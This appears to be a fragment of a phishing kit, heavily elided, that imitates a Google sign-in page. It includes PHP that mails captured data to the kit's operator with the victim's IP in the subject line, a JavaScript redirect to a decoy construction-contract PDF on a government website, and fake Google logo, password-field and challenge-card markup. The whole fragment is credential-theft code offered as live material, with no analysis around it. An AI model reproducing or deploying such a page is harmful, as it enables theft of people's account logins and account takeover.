...
$hi = mail($to,"Gmail | ".$ip, $message,$headers); 
}
?> 
<script type="text/javascript"> 
<!-- 
   window.location="http://www.buckeyeaz.gov/wp-content/uploads/2017/04/SAMPLE-CONSTRUCTION-CONTRACT.pdf"; 
...
function validateForm() {
  ...
  <img alt="Google" class="logo" src="dbx/google.png">
  </div>
  </div>
...
<div class="card flex-card challenge-card">
  ...
  ********</label>
  ...
  <label for="lang-chooser"><img src="dbx/universal_language_settings-21.png" alt="Change language"></label>
